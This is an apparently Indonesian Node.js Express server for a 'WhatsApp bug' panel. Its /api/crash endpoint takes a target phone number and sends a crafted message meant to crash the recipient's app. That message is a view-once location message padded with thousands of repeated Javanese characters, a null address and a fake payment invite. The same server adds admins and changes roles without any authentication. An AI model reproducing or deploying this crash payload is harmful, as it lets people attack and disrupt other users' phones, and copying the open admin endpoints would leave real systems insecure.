const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY
async function PouNt(target) {
    try {
        const PouMessage = {
            viewOnceMessage: {
                message: {
                    locationMessage: {
                        degreesLatitude: 250208,
                        degreesLongitude: 250208,
                        name: "PouMods Official" + "ꦾꦾꦾꦾꦾ".repeat(5000),
                        address: "\u0000",
                        contextInfo: {
                            quotedMessage: {
                                extendedTextMessage: {
                                    text: "ꨄ 𝐏𝐨𝐮𝐌𝐨𝐝𝐬 𝐎𝐟𝐟𝐜𝐢𝐚𝐥 ᥫ᭡" + "ꦾꦾꦾꦾꦾ".repeat(5000),
                                },
                                paymentInviteMessage: {
                                    currency: "USD",
                                    amount: 10000000,
                                    from: "0@s.whatsapp.net", 
                                    note: "ꨄ 𝐏𝐨𝐮𝐌𝐨𝐝𝐬 𝐎𝐟𝐟𝐜𝐢𝐚𝐥 ᥫ᭡",
                                    expiryTimestamp: Date.now() 
                                }
                            }
                        }
                    }
                }
            }
        };

        await sock.sendMessage(target, PouMessage);
        console.log("DONE BY POU");
    } catch (err) {
        console.error("ERROR NJIR:", err);
    }
}
//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await PouNt(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
